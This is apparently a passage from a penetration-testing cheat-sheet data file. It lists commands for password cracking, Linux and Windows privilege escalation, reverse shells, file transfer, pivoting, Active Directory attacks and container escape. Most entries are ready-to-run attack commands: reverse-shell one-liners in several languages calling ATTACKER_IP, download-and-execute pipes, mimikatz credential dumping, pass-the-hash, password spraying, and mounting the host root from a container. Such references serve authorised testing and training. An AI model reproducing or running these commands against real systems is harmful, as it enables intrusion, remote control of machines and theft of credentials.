        desc: 'Crack Kerberos 5 TGS tickets (Kerberoasting)',
      },
      {
        cmd: 'john --show HASH_FILE',
        desc: 'Display previously cracked passwords from pot file',
      },
      {
        cmd: 'john --incremental HASH_FILE',
        desc: 'Pure brute force using incremental mode',
      },
      {
        cmd: 'john --incremental=digits HASH_FILE',
        desc: 'Brute force using digits only (0-9)',
      },
      {
        cmd: 'john --mask=?u?l?l?l?d?d?d?d HASH_FILE',
        desc: 'Mask attack (1 upper, 3 lower, 4 digits pattern)',
      },
      {
        cmd: 'john --list=formats',
        desc: 'List all supported hash formats',
      },
      {
        cmd: 'john --list=rules',
        desc: 'List all available rule sets',
      },
      {
        cmd: 'john --fork=4 --wordlist=WORDLIST HASH_FILE',
        desc: 'Use 4 CPU cores in parallel (fork processes)',
      },
      {
        cmd: 'unshadow /etc/passwd /etc/shadow > unshadowed.txt',
        desc: 'Combine passwd and shadow files for cracking',
      },
      {
        cmd: 'zip2john protected.zip > zip_hash.txt',
        desc: 'Extract crackable hash from a password-protected ZIP',
      },
      {
        cmd: 'rar2john protected.rar > rar_hash.txt',
        desc: 'Extract crackable hash from a password-protected RAR',
      },
      {
        cmd: 'ssh2john id_rsa > ssh_hash.txt',
        desc: 'Extract hash from a passphrase-protected SSH private key',
      },
      {
        cmd: 'keepass2john database.kdbx > keepass_hash.txt',
        desc: 'Extract hash from a KeePass database file',
      },
      {
        cmd: 'pdf2john protected.pdf > pdf_hash.txt',
        desc: 'Extract hash from a password-protected PDF document',
      },
      {
        cmd: 'office2john protected.docx > office_hash.txt',
        desc: 'Extract hash from a password-protected Office document',
      },
      {
        cmd: 'john --restore',
        desc: 'Restore and continue a previous cracking session',
      },
      {
        cmd: 'john --session=mysession --wordlist=WORDLIST HASH_FILE',
        desc: 'Name a session for later restore with --restore=mysession',
      },
    ],
  },

  // =========================================================================
  // 10. Hashcat
  // =========================================================================
  {
    name: 'Hashcat',
    desc: 'GPU-accelerated password hash cracking',
    items: [
      {
        cmd: 'hashcat -m 0 HASH_FILE WORDLIST',
        desc: 'Crack MD5 hashes (-m 0) with a wordlist',
      },
      {
        cmd: 'hashcat -m 100 HASH_FILE WORDLIST',
        desc: 'Crack SHA-1 hashes (-m 100)',
      },
      {
        cmd: 'hashcat -m 1400 HASH_FILE WORDLIST',
        desc: 'Crack SHA-256 hashes (-m 1400)',
      },
      {
        cmd: 'hashcat -m 1700 HASH_FILE WORDLIST',
        desc: 'Crack SHA-512 hashes (-m 1700)',
      },
      {
        cmd: 'hashcat -m 1000 HASH_FILE WORDLIST',
        desc: 'Crack NTLM hashes (-m 1000)',
      },
      {
        cmd: 'hashcat -m 3200 HASH_FILE WORDLIST',
        desc: 'Crack bcrypt hashes (-m 3200)',
      },
      {
        cmd: 'hashcat -m 1800 HASH_FILE WORDLIST',
        desc: 'Crack SHA-512 Unix crypt ($6$) hashes',
      },
      {
        cmd: 'hashcat -m 13100 HASH_FILE WORDLIST',
        desc: 'Crack Kerberos 5 TGS-REP (Kerberoasting)',
      },
      {
        cmd: 'hashcat -m 5600 HASH_FILE WORDLIST',
        desc: 'Crack NetNTLMv2 hashes',
      },
      {
        cmd: 'hashcat -m 18200 HASH_FILE WORDLIST',
        desc: 'Crack Kerberos 5 AS-REP (ASREPRoasting)',
      },
      {
        cmd: 'hashcat -a 0 -m 0 HASH_FILE WORDLIST',
        desc: 'Attack mode 0: straight dictionary attack',
      },
      {
        cmd: 'hashcat -a 1 -m 0 HASH_FILE WORDLIST1 WORDLIST2',
        desc: 'Attack mode 1: combination of two wordlists',
      },
      {
        cmd: 'hashcat -a 3 -m 0 HASH_FILE ?a?a?a?a?a?a',
        desc: 'Attack mode 3: brute force with mask (?a = all chars)',
      },
      {
        cmd: 'hashcat -a 3 -m 0 HASH_FILE ?u?l?l?l?l?d?d?d?s',
        desc: 'Mask: 1 upper, 4 lower, 3 digits, 1 special',
      },
      {
        cmd: 'hashcat -a 6 -m 0 HASH_FILE WORDLIST ?d?d?d',
        desc: 'Attack mode 6: hybrid wordlist + mask appended',
      },
      {
        cmd: 'hashcat -a 7 -m 0 HASH_FILE ?d?d?d WORDLIST',
        desc: 'Attack mode 7: hybrid mask prepended + wordlist',
      },
      {
        cmd: 'hashcat -m 0 HASH_FILE WORDLIST -r rules/best64.rule',
        desc: 'Apply the best64 rule file for word mutations',
      },
      {
        cmd: 'hashcat -m 0 HASH_FILE WORDLIST -r rules/dive.rule',
        desc: 'Apply the comprehensive dive rule set',
      },
      {
        cmd: 'hashcat -m 0 HASH_FILE WORDLIST --force',
        desc: 'Force execution even with driver warnings',
      },
      {
        cmd: 'hashcat -m 0 HASH_FILE WORDLIST -o cracked.txt',
        desc: 'Write cracked hash:password pairs to output file',
      },
      {
        cmd: 'hashcat -m 0 HASH_FILE --show',
        desc: 'Display already-cracked hashes from the potfile',
      },
      {
        cmd: 'hashcat -m 0 HASH_FILE WORDLIST -w 3',
        desc: 'Set workload profile (1=low, 2=default, 3=high, 4=nightmare)',
      },
      {
        cmd: 'hashcat -m 0 HASH_FILE WORDLIST --session=mysess',
        desc: 'Name the cracking session for later restore',
      },
      {
        cmd: 'hashcat --restore --session=mysess',
        desc: 'Restore a previously saved cracking session',
      },
      {
        cmd: 'hashcat -I',
        desc: 'Display detected OpenCL/CUDA GPU devices',
      },
      {
        cmd: 'hashcat --benchmark',
        desc: 'Benchmark hash cracking speed for all supported types',
      },
      {
        cmd: 'hashcat -m 22000 capture.hc22000 WORDLIST',
        desc: 'Crack WPA/WPA2 from PMKID or EAPOL capture',
      },
    ],
  },

  // =========================================================================
  // 11. Linux Privilege Escalation
  // =========================================================================
  {
    name: 'Linux Privilege Escalation',
    desc: 'Techniques for escalating privileges on Linux systems',
    items: [
      {
        cmd: 'id',
        desc: 'Show current user, group memberships, and privileges',
      },
      {
        cmd: 'whoami',
        desc: 'Print the current effective username',
      },
      {
        cmd: 'uname -a',
        desc: 'Display kernel version and full system information',
      },
      {
        cmd: 'cat /etc/os-release',
        desc: 'Identify the Linux distribution and release version',
      },
      {
        cmd: 'cat /proc/version',
        desc: 'Get kernel version string for exploit matching',
      },
      {
        cmd: 'sudo -l',
        desc: 'List commands the current user can run via sudo',
      },
      {
        cmd: 'find / -perm -4000 -type f 2>/dev/null',
        desc: 'Find all SUID binaries on the system',
      },
      {
        cmd: 'find / -perm -2000 -type f 2>/dev/null',
        desc: 'Find all SGID binaries on the system',
      },
      {
        cmd: 'find / -writable -type d 2>/dev/null',
        desc: 'Find world-writable directories',
      },
      {
        cmd: 'find / -writable -type f 2>/dev/null',
        desc: 'Find world-writable files',
      },
      {
        cmd: 'cat /etc/crontab',
        desc: 'View system-wide cron job definitions',
      },
      {
        cmd: 'ls -la /etc/cron*',
        desc: 'List all cron directories and their contents',
      },
      {
        cmd: 'crontab -l',
        desc: 'List cron jobs for the current user',
      },
      {
        cmd: 'cat /etc/passwd',
        desc: 'List all user accounts on the system',
      },
      {
        cmd: 'cat /etc/shadow',
        desc: 'Read password hashes (requires root or misconfigured permissions)',
      },
      {
        cmd: 'getcap -r / 2>/dev/null',
        desc: 'Find binaries with special Linux capabilities set',
      },
      {
        cmd: 'echo $PATH',
        desc: 'Check PATH for writable/hijackable directories',
      },
      {
        cmd: 'ls -la /tmp /var/tmp /dev/shm',
        desc: 'Check common world-writable temp directories',
      },
      {
        cmd: 'find / -name "*.py" -writable 2>/dev/null',
        desc: 'Find writable Python scripts for library hijacking',
      },
      {
        cmd: 'ps aux --forest',
        desc: 'List all running processes with parent-child hierarchy',
      },
      {
        cmd: 'ss -tlnp',
        desc: 'List all listening TCP sockets with process info',
      },
      {
        cmd: 'netstat -tulnp',
        desc: 'Show listening ports and their associated PIDs',
      },
      {
        cmd: 'env',
        desc: 'Display environment variables (may contain credentials)',
      },
      {
        cmd: 'cat /etc/exports',
        desc: 'Check NFS exports for no_root_squash misconfiguration',
      },
      {
        cmd: 'find / -name id_rsa 2>/dev/null',
        desc: 'Search for SSH private keys on the filesystem',
      },
      {
        cmd: 'find / -name "*.conf" -exec grep -l "password" {} \\; 2>/dev/null',
        desc: 'Search config files for password strings',
      },
      {
        cmd: 'history',
        desc: 'Check command history for credentials or sensitive commands',
      },
      {
        cmd: './linpeas.sh',
        desc: 'Run LinPEAS automated privilege escalation scanner',
      },
      {
        cmd: './linux-exploit-suggester.sh',
        desc: 'Suggest kernel exploits based on current kernel version',
      },
      {
        cmd: 'dpkg -l 2>/dev/null | grep -i "sudo\\|pkexec"',
        desc: 'Check sudo/pkexec versions for known CVEs',
      },
    ],
  },

  // =========================================================================
  // 12. Windows Privilege Escalation
  // =========================================================================
  {
    name: 'Windows Privilege Escalation',
    desc: 'Techniques for escalating privileges on Windows systems',
    items: [
      {
        cmd: 'whoami /all',
        desc: 'Show current user, all groups, and all privileges',
      },
      {
        cmd: 'systeminfo',
        desc: 'Display detailed OS version, architecture, and installed patches',
      },
      {
        cmd: 'net user',
        desc: 'List all local user accounts',
      },
      {
        cmd: 'net localgroup Administrators',
        desc: 'List members of the local Administrators group',
      },
      {
        cmd: 'net user USER',
        desc: 'Get detailed information on a specific user',
      },
      {
        cmd: 'wmic service get name,startname,pathname | findstr /i /v "C:\\Windows"',
        desc: 'Find services with unquoted paths outside C:\\Windows',
      },
      {
        cmd: 'sc qc SERVICE_NAME',
        desc: 'Query a service configuration (binary path, start type)',
      },
      {
        cmd: 'accesschk.exe /accepteula -uwcqv "Authenticated Users" *',
        desc: 'Check which services authenticated users can modify',
      },
      {
        cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
        desc: 'Check if AlwaysInstallElevated is enabled (MSI escalation)',
      },
      {
        cmd: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
        desc: 'Check for autologon credentials stored in registry',
      },
      {
        cmd: 'cmdkey /list',
        desc: 'List stored Windows credentials',
      },
      {
        cmd: 'dir /s /b C:\\Users\\*.txt C:\\Users\\*.ini C:\\Users\\*.cfg 2>nul',
        desc: 'Search user directories for config and text files',
      },
      {
        cmd: 'icacls "C:\\Program Files\\SERVICE_DIR"',
        desc: 'Check file/directory ACLs for weak permissions',
      },
      {
        cmd: 'schtasks /query /fo LIST /v',
        desc: 'List all scheduled tasks with verbose details',
      },
      {
        cmd: 'tasklist /SVC',
        desc: 'List running processes and their associated services',
      },
      {
        cmd: 'netstat -ano',
        desc: 'Show all active network connections with PIDs',
      },
      {
        cmd: 'wmic qfe get HotFixID,InstalledOn',
        desc: 'List installed security patches and hotfixes',
      },
      {
        cmd: 'powershell Get-Process',
        desc: 'List running processes via PowerShell',
      },
      {
        cmd: '.\\winPEASx64.exe',
        desc: 'Run winPEAS automated privilege escalation scanner',
      },
      {
        cmd: 'whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"',
        desc: 'Check for token impersonation privileges (potato attacks)',
      },
      {
        cmd: '.\\PrintSpoofer.exe -i -c cmd',
        desc: 'Exploit SeImpersonatePrivilege via PrintSpoofer',
      },
      {
        cmd: '.\\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\\Temp\\rev.exe" -t *',
        desc: 'JuicyPotato exploitation for SeImpersonatePrivilege',
      },
      {
        cmd: 'reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s',
        desc: 'Check PuTTY saved sessions for stored credentials',
      },
      {
        cmd: 'dir /s /b C:\\*.kdbx 2>nul',
        desc: 'Search the entire C: drive for KeePass database files',
      },
      {
        cmd: 'powershell (New-Object System.Net.WebClient).DownloadFile("http://ATTACKER_IP/winPEAS.exe","C:\\Temp\\winPEAS.exe")',
        desc: 'Download winPEAS to the target for enumeration',
      },
    ],
  },

  // =========================================================================
  // 13. Reverse Shells
  // =========================================================================
  {
    name: 'Reverse Shells',
    desc: 'One-liners and payloads for reverse shell connections in various languages',
    items: [
      {
        cmd: 'bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1',
        desc: 'Bash TCP reverse shell',
      },
      {
        cmd: 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1"',
        desc: 'Bash reverse shell wrapped in bash -c for portability',
      },
      {
        cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP LPORT >/tmp/f',
        desc: 'Netcat reverse shell using a named pipe (FIFO)',
      },
      {
        cmd: 'nc -e /bin/bash ATTACKER_IP LPORT',
        desc: 'Netcat reverse shell using -e flag (traditional nc only)',
      },
      {
        cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        desc: 'Python 3 reverse shell one-liner',
      },
      {
        cmd: "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        desc: 'Python 2 reverse shell one-liner',
      },
      {
        cmd: 'php -r \'$sock=fsockopen("ATTACKER_IP",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'',
        desc: 'PHP reverse shell using fsockopen and exec',
      },
      {
        cmd: 'php -r \'$sock=fsockopen("ATTACKER_IP",LPORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\'',
        desc: 'PHP reverse shell using proc_open',
      },
      {
        cmd: 'perl -e \'use Socket;$i="ATTACKER_IP";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'',
        desc: 'Perl reverse shell one-liner',
      },
      {
        cmd: 'ruby -rsocket -e \'f=TCPSocket.open("ATTACKER_IP",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        desc: 'Ruby reverse shell one-liner',
      },
      {
        cmd: 'powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\'ATTACKER_IP\',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\'PS \'+$(pwd).Path+\'> \';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"',
        desc: 'PowerShell TCP reverse shell (full one-liner)',
      },
      {
        cmd: 'powershell -e BASE64_ENCODED_PAYLOAD',
        desc: 'PowerShell reverse shell from Base64-encoded command',
      },
      {
        cmd: 'socat exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:LPORT',
        desc: 'Socat reverse shell with full interactive PTY',
      },
      {
        cmd: 'socat TCP-LISTEN:LPORT,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid',
        desc: 'Socat bind shell listener with PTY',
      },
      {
        cmd: 'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'ATTACKER_IP\',LPORT);os.execute(\'/bin/sh -i <&3 >&3 2>&3\')"',
        desc: 'Lua reverse shell one-liner',
      },
      {
        cmd: 'python3 -c "import pty; pty.spawn(\\"/bin/bash\\")"',
        desc: 'Upgrade dumb shell: spawn a PTY with Python',
      },
      {
        cmd: 'script /dev/null -c bash',
        desc: 'Upgrade dumb shell: spawn a PTY using script command',
      },
      {
        cmd: '/usr/bin/script -qc /bin/bash /dev/null',
        desc: 'Alternative script-based PTY upgrade',
      },
      {
        cmd: 'export TERM=xterm',
        desc: 'Shell upgrade step: set terminal type for proper rendering',
      },
      {
        cmd: 'stty raw -echo; fg',
        desc: 'Shell upgrade step: enable raw mode for full interactivity',
      },
      {
        cmd: 'rlwrap nc -lvnp LPORT',
        desc: 'Listener with readline wrapper for arrow keys and history',
      },
    ],
  },

  // =========================================================================
  // 14. File Transfers
  // =========================================================================
  {
    name: 'File Transfers',
    desc: 'Methods for transferring files between attacker and target machines',
    items: [
      {
        cmd: 'python3 -m http.server 8000',
        desc: 'Start a Python 3 HTTP server in the current directory',
      },
      {
        cmd: 'python -m SimpleHTTPServer 8000',
        desc: 'Start a Python 2 HTTP server in the current directory',
      },
      {
        cmd: 'php -S 0.0.0.0:8000',
        desc: 'Start a PHP built-in web server',
      },
      {
        cmd: 'ruby -run -e httpd . -p 8000',
        desc: 'Start a Ruby HTTP server in the current directory',
      },
      {
        cmd: 'wget http://ATTACKER_IP:8000/file -O /tmp/file',
        desc: 'Download a file with wget to a specific path',
      },
      {
        cmd: 'curl http://ATTACKER_IP:8000/file -o /tmp/file',
        desc: 'Download a file with curl to a specific path',
      },
      {
        cmd: 'curl http://ATTACKER_IP:8000/file | bash',
        desc: 'Download and execute a script directly (use with caution)',
      },
      {
        cmd: 'scp file USER@TARGET:/path/',
        desc: 'Copy a file to a remote host via SCP',
      },
      {
        cmd: 'scp USER@TARGET:/path/file .',
        desc: 'Copy a file from a remote host via SCP',
      },
      {
        cmd: 'scp -r dir/ USER@TARGET:/path/',
        desc: 'Copy an entire directory recursively via SCP',
      },
      {
        cmd: 'nc -lvnp LPORT > received_file',
        desc: 'Receive a file via netcat (start listener first)',
      },
      {
        cmd: 'nc ATTACKER_IP LPORT < file_to_send',
        desc: 'Send a file to a netcat listener',
      },
      {
        cmd: 'certutil.exe -urlcache -f http://ATTACKER_IP:8000/file C:\\Temp\\file',
        desc: 'Windows: download a file using certutil',
      },
      {
        cmd: 'powershell Invoke-WebRequest -Uri http://ATTACKER_IP:8000/file -OutFile C:\\Temp\\file',
        desc: 'Windows: download using PowerShell Invoke-WebRequest',
      },
      {
        cmd: 'powershell (New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP:8000/file","C:\\Temp\\file")',
        desc: 'Windows: download using PowerShell WebClient',
      },
      {
        cmd: 'powershell Start-BitsTransfer -Source http://ATTACKER_IP:8000/file -Destination C:\\Temp\\file',
        desc: 'Windows: download using BITS transfer',
      },
      {
        cmd: 'bitsadmin /transfer job /download /priority high http://ATTACKER_IP:8000/file C:\\Temp\\file',
        desc: 'Windows: download using bitsadmin command',
      },
      {
        cmd: 'impacket-smbserver share $(pwd) -smb2support',
        desc: 'Start an SMB file server with Impacket',
      },
      {
        cmd: 'copy \\\\ATTACKER_IP\\share\\file C:\\Temp\\file',
        desc: 'Windows: copy a file from an SMB share',
      },
      {
        cmd: 'base64 -w0 file > file.b64',
        desc: 'Base64 encode a file (no line wrapping) for copy-paste transfer',
      },
      {
        cmd: 'base64 -d file.b64 > file',
        desc: 'Decode a Base64-encoded file back to binary',
      },
      {
        cmd: 'rsync -avz file USER@TARGET:/path/',
        desc: 'Transfer a file with rsync over SSH',
      },
      {
        cmd: 'tftp -i TARGET GET file',
        desc: 'Download a file via TFTP (if TFTP server is running)',
      },
    ],
  },

  // =========================================================================
  // 15. Port Forwarding
  // =========================================================================
  {
    name: 'Port Forwarding',
    desc: 'SSH tunneling, pivoting, and traffic redirection techniques',
    items: [
      {
        cmd: 'ssh -L LPORT:TARGET:RPORT USER@PIVOT_HOST',
        desc: 'SSH local port forward: access remote service via localhost',
        example: 'ssh -L 8080:10.10.10.5:80 user@pivot.example.com',
      },
      {
        cmd: 'ssh -R RPORT:localhost:LPORT USER@ATTACKER_IP',
        desc: 'SSH remote port forward: expose local service to a remote host',
      },
      {
        cmd: 'ssh -D 1080 USER@PIVOT_HOST',
        desc: 'SSH dynamic port forward: create a SOCKS proxy',
      },
      {
        cmd: 'ssh -N -f -L LPORT:TARGET:RPORT USER@PIVOT_HOST',
        desc: 'SSH local forward in background with no interactive shell',
      },
      {
        cmd: 'ssh -J USER@JUMP_HOST USER@TARGET',
        desc: 'SSH jump host (ProxyJump) for multi-hop access',
      },
      {
        cmd: 'ssh -L 8080:10.10.10.5:80 USER@PIVOT_HOST',
        desc: 'Example: access internal web server at 10.10.10.5:80 via localhost:8080',
      },
      {
        cmd: 'proxychains nmap -sT -Pn TARGET',
        desc: 'Run nmap through proxychains SOCKS proxy',
      },
      {
        cmd: 'proxychains curl http://TARGET',
        desc: 'Route curl requests through proxychains',
      },
      {
        cmd: 'chisel server --reverse --port 8000',
        desc: 'Start chisel server on attacker machine in reverse mode',
      },
      {
        cmd: 'chisel client ATTACKER_IP:8000 R:LPORT:TARGET:RPORT',
        desc: 'Chisel client: create reverse port forward',
      },
      {
        cmd: 'chisel client ATTACKER_IP:8000 R:socks',
        desc: 'Chisel client: create reverse SOCKS proxy',
      },
      {
        cmd: 'socat TCP-LISTEN:LPORT,fork TCP:TARGET:RPORT',
        desc: 'Socat: simple TCP port forwarder/relay',
      },
      {
        cmd: 'socat TCP-LISTEN:LPORT,fork,reuseaddr TCP:TARGET:RPORT',
        desc: 'Socat relay with address reuse for persistent forwarding',
      },
      {
        cmd: './ligolo-ng_agent -connect ATTACKER_IP:11601 -retry -ignore-cert',
        desc: 'Ligolo-ng agent: connect back to proxy server',
      },
      {
        cmd: 'ip route add 10.10.10.0/24 dev ligolo',
        desc: 'Add a route for the Ligolo-ng tunnel interface',
      },
      {
        cmd: 'netsh interface portproxy add v4tov4 listenport=LPORT listenaddress=0.0.0.0 connectport=RPORT connectaddress=TARGET',
        desc: 'Windows netsh: create a port proxy rule',
      },
      {
        cmd: 'netsh interface portproxy show all',
        desc: 'Windows: list all active port proxy rules',
      },
      {
        cmd: 'netsh interface portproxy delete v4tov4 listenport=LPORT listenaddress=0.0.0.0',
        desc: 'Windows: delete a specific port proxy rule',
      },
      {
        cmd: 'plink.exe -ssh -L LPORT:TARGET:RPORT USER@PIVOT_HOST -pw PASS',
        desc: 'PuTTY plink: SSH local forward from Windows',
      },
      {
        cmd: 'sshuttle -r USER@PIVOT_HOST 10.10.10.0/24',
        desc: 'Transparent VPN-over-SSH with sshuttle (routes entire subnet)',
      },
      {
        cmd: 'sshuttle -r USER@PIVOT_HOST 10.10.10.0/24 --dns',
        desc: 'sshuttle with DNS forwarding through the tunnel',
      },
    ],
  },

  // =========================================================================
  // 16. Active Directory
  // =========================================================================
  {
    name: 'Active Directory',
    desc: 'Enumeration, Kerberos attacks, lateral movement in AD environments',
    items: [
      {
        cmd: 'bloodhound-python -u USER -p PASS -d DOMAIN -c All -ns DC_IP',
        desc: 'BloodHound: remotely collect all AD data with Python ingestor',
      },
      {
        cmd: 'SharpHound.exe -c All',
        desc: 'BloodHound: collect AD data from a domain-joined Windows host',
      },
      {
        cmd: 'crackmapexec smb TARGET -u USER -p PASS',
        desc: 'CrackMapExec: validate credentials via SMB authentication',
      },
      {
        cmd: 'crackmapexec smb TARGET -u USER -p PASS --shares',
        desc: 'CrackMapExec: enumerate accessible SMB shares',
      },
      {
        cmd: 'crackmapexec smb TARGET -u USER -p PASS --users',
        desc: 'CrackMapExec: enumerate domain user accounts',
      },
      {
        cmd: 'crackmapexec smb TARGET -u USER -p PASS -x "whoami"',
        desc: 'CrackMapExec: execute a command on the target via SMB',
      },
      {
        cmd: 'crackmapexec smb TARGET -u USER -H NTLM_HASH',
        desc: 'CrackMapExec: authenticate using pass-the-hash',
      },
      {
        cmd: 'impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP',
        desc: 'ASREPRoasting: find users without Kerberos pre-authentication',
      },
      {
        cmd: 'impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request',
        desc: 'Kerberoasting: request TGS tickets for cracking offline',
      },
      {
        cmd: 'impacket-secretsdump DOMAIN/USER:PASS@DC_IP',
        desc: 'Dump NTDS.dit, SAM, and LSA secrets via DCSync',
      },
      {
        cmd: 'impacket-psexec DOMAIN/USER:PASS@TARGET',
        desc: 'Get a SYSTEM shell via PsExec-style SMB execution',
      },
      {
        cmd: 'impacket-wmiexec DOMAIN/USER:PASS@TARGET',
        desc: 'Get a shell via WMI remote execution',
      },
      {
        cmd: 'impacket-smbexec DOMAIN/USER:PASS@TARGET',
        desc: 'Get a shell via SMB-based execution',
      },
      {
        cmd: 'impacket-psexec DOMAIN/USER@TARGET -hashes :NTLM_HASH',
        desc: 'PsExec with pass-the-hash (no plaintext password needed)',
      },
      {
        cmd: 'evil-winrm -i TARGET -u USER -p PASS',
        desc: 'WinRM interactive shell with plaintext credentials',
      },
      {
        cmd: 'evil-winrm -i TARGET -u USER -H NTLM_HASH',
        desc: 'WinRM shell with pass-the-hash authentication',
      },
      {
        cmd: 'rpcclient -U "USER%PASS" TARGET',
        desc: 'Connect via RPC for AD enumeration commands',
      },
      {
        cmd: 'rpcclient -U "" TARGET -N',
        desc: 'Attempt RPC null session (anonymous access)',
      },
      {
        cmd: 'enum4linux -a TARGET',
        desc: 'Automated SMB and NetBIOS enumeration',
      },
      {
        cmd: 'ldapsearch -x -H ldap://DC_IP -b "DC=DOMAIN,DC=com" -D "USER@DOMAIN" -w PASS',
        desc: 'LDAP search with authenticated bind',
      },
      {
        cmd: 'kerbrute userenum -d DOMAIN --dc DC_IP users.txt',
        desc: 'Kerbrute: enumerate valid domain usernames via Kerberos',
      },
      {
        cmd: 'kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt PASS',
        desc: 'Kerbrute: spray a single password against all users',
      },
      {
        cmd: 'mimikatz "sekurlsa::logonpasswords" exit',
        desc: 'Mimikatz: dump cleartext passwords and hashes from memory',
      },
      {
        cmd: 'mimikatz "lsadump::dcsync /user:DOMAIN\\krbtgt" exit',
        desc: 'Mimikatz: DCSync to extract the krbtgt hash',
      },
      {
        cmd: 'Rubeus.exe kerberoast',
        desc: 'Rubeus: Kerberoast all service accounts',
      },
    ],
  },

  // =========================================================================
  // 17. Docker Security
  // =========================================================================
  {
    name: 'Docker Security',
    desc: 'Container security, escape techniques, and image analysis',
    items: [
      {
        cmd: 'docker ps',
        desc: 'List all currently running containers',
      },
      {
        cmd: 'docker ps -a',
        desc: 'List all containers including stopped ones',
      },
      {
        cmd: 'docker images',
        desc: 'List all local Docker images',
      },
      {
        cmd: 'docker inspect CONTAINER_ID',
        desc: 'Show detailed container configuration as JSON',
      },
      {
        cmd: 'docker exec -it CONTAINER_ID /bin/bash',
        desc: 'Get an interactive shell inside a running container',
      },
      {
        cmd: 'docker logs CONTAINER_ID',
        desc: 'View stdout/stderr logs from a container',
      },
      {
        cmd: 'docker history IMAGE_NAME',
        desc: 'View image layer history (may reveal embedded secrets)',
      },
      {
        cmd: 'docker save IMAGE_NAME -o image.tar',
        desc: 'Export an image as a tar archive for offline analysis',
      },
      {
        cmd: 'ls -la /var/run/docker.sock',
        desc: 'Check if the Docker socket is accessible (escape vector)',
      },
      {
        cmd: 'docker -H unix:///var/run/docker.sock ps',
        desc: 'Use exposed Docker socket to control host daemon',
      },
      {
        cmd: 'docker run -v /:/host -it alpine chroot /host',
        desc: 'Escape: mount host root filesystem and chroot into it',
      },
      {
        cmd: 'docker run --privileged -it alpine',
        desc: 'Run a fully privileged container (dangerous)',
      },
      {
        cmd: 'cat /proc/1/cgroup',
        desc: 'Detect if running inside a container (check cgroup)',
      },
      {
        cmd: 'ls -la /.dockerenv',
        desc: 'Check for .dockerenv file (container indicator)',
      },
      {
        cmd: 'capsh --print',
        desc: 'Print current Linux capabilities (look for dangerous caps)',
      },
      {
        cmd: 'fdisk -l 2>/dev/null',
        desc: 'List disks in a privileged container (access host storage)',
      },
      {
        cmd: 'mount /dev/sda1 /mnt',
        desc: 'Mount host disk partition from inside a privileged container',
      },
      {
        cmd: 'nsenter --target 1 --mount --uts --ipc --net --pid -- bash',
        desc: 'Escape to host namespace via nsenter from privileged container',
      },
      {
        cmd: 'trivy image IMAGE_NAME',
        desc: 'Scan a Docker image for known vulnerabilities with Trivy',
      },
      {
        cmd: 'dive IMAGE_NAME',
        desc: 'Interactively analyze Docker image layers with dive',
      },
      {
        cmd: 'docker network ls',
        desc: 'List all Docker networks',
      },
      {
        cmd: 'docker network inspect bridge',
        desc: 'Inspect default bridge network (discover other containers)',
      },
      {
        cmd: 'cat /proc/self/status | grep Cap',
        desc: 'Check effective capabilities of current container process',
      },
      {
        cmd: 'grype IMAGE_NAME',
        desc: 'Scan image for vulnerabilities with Anchore Grype',
      },
    ],
  },

  // =========================================================================
  // 18. Kubernetes Security
  // =========================================================================
  {
    name: 'Kubernetes Security',
    desc: 'Pod escape, RBAC abuse, secrets enumeration in Kubernetes clusters',
    items: [
      {
        cmd: 'kubectl get pods --all-namespaces',
        desc: 'List all pods across every namespace in the cluster',
      },
      {
        cmd: 'kubectl get pods -o wide',
        desc: 'List pods with node placement and IP details',
      },
      {
        cmd: 'kubectl get secrets --all-namespaces',
        desc: 'List all secrets across all namespaces',
      },
      {
        cmd: 'kubectl get secret SECRET_NAME -o jsonpath="{.data}"',
        desc: 'Read a specific secret (values are Base64 encoded)',
      },
      {
        cmd: 'kubectl get secret SECRET_NAME -o jsonpath="{.data.password}" | base64 -d',
        desc: 'Decode a specific secret value from Base64',
      },
      {
        cmd: 'kubectl get serviceaccounts --all-namespaces',
        desc: 'List all service accounts in the cluster',
      },
      {
        cmd: 'kubectl auth can-i --list',
        desc: 'List all actions the current identity is allowed to perform',
      },
      {
        cmd: 'kubectl auth can-i create pods',
        desc: 'Check if you can create new pods',
      },
      {
        cmd: 'kubectl get clusterrolebindings -o wide',
        desc: 'List all cluster-wide role bindings',
      },
      {
        cmd: 'kubectl get rolebindings --all-namespaces -o wide',
        desc: 'List namespace-scoped role bindings',
      },
      {
